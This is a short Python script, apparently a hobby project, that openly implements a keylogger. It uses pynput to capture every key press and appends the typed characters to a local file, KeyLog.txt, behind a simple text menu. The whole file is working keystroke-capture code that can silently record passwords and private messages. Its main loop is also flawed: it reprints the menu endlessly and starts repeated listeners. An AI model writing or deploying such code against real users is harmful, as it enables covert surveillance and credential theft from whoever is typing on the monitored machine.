from pynput import keyboard
from SRC.Global import GlobalState
from SRC.Phases import CurrentPhases

def key_pressed(key):
    if key == keyboard.Key.esc:
        print("Program Ended")
        quit()
    print(str(key))
    with open("KeyLog.txt","a") as KeyLog:
        try:
            char = key.char
            KeyLog.write(char)
                    
        except:
            if key == keyboard.Key.space:
                char = " "
                KeyLog.write(char)
            else:
                pass

while True:
    if GlobalState.GlobalPhase == CurrentPhases.MENU:
        print("<--KeyLogger-->\nExecute\t > 1\nSettings\t > 2")

    elif GlobalState.GlobalPhase == CurrentPhases.PLAY:
        listener = keyboard.Listener(on_press=key_pressed)
        listener.start()
        input()
            
